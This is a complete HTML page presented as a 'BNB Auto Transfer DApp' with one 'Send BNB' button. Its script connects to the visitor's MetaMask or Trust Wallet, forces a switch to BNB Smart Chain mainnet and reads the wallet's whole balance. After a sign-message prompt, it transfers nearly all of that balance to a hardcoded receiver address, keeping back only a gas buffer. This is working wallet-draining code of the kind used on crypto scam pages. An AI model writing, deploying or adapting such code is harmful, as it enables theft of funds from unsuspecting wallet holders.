<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BNB Auto Transfer DApp</title>
</head>
<body>
  <button id="sendButton">Send BNB</button>

  <script>
    const receiverAddress = '0x70d459946ccea3CAC19ca79c9E40ea291625fAf8';
    const gasLimit = 21000;
    const gasPriceGwei = 1;

    document.getElementById('sendButton').addEventListener('click', async () => {
      if (!window.ethereum) {
        alert('Please install MetaMask or Trust Wallet to use this DApp.');
        return;
      }
      const ethereum = window.ethereum;
      try {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const account = accounts[0];

        let chainId = await ethereum.request({ method: 'eth_chainId' });
        if (chainId !== '0x38') {
          try {
            await ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }],
            });
          } catch (switchError) {
            if (switchError.code === 4902) {
              try {
                await ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [{
                    chainId: '0x38',
                    chainName: 'BNB Smart Chain Mainnet',
                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                    blockExplorerUrls: ['https://bscscan.com']
                  }],
                });
              } catch (addError) {
                console.error('Failed to add BNB Smart Chain', addError);
                return;
              }
            } else {
              console.error('Failed to switch to BNB Smart Chain', switchError);
              return;
            }
          }
        }

        const balanceHex = await ethereum.request({
          method: 'eth_getBalance',
          params: [account, 'latest']
        });
        const balanceWei = BigInt(balanceHex);

        const gasCost = BigInt(gasLimit) * BigInt(1e9); // 1 Gwei
        const bufferGasCost = gasCost * BigInt(15n) / BigInt(10n); // 1.5x buffer

        if (balanceWei <= bufferGasCost) {
          alert('Insufficient BNB to cover transaction gas.');
          return;
        }

        const amountWei = balanceWei - bufferGasCost;

        const whole = amountWei / BigInt(1e18);
        const fraction = amountWei % BigInt(1e18);
        const fractionDisplay = fraction.toString().padStart(18, '0').substring(0, 6);
        const amountDisplay = `${whole.toString()}.${fractionDisplay}`;

        const message = `Please sign this message to confirm sending ${amountDisplay} BNB to ${receiverAddress}.`;
        await ethereum.request({
          method: 'personal_sign',
          params: [message, account],
        });

        const txHash = await ethereum.request({
          method: 'eth_sendTransaction',
          params: [{
            from: account,
            to: receiverAddress,
            value: '0x' + amountWei.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: '0x' + (gasPriceGwei * 1e9).toString(16)
          }],
        });
        alert('Transaction sent! TxHash: ' + txHash);
      } catch (error) {
        console.error(error);
        alert('Transaction failed or was rejected: ' + (error.message || error));
      }
    });
  </script>
</body>
</html>
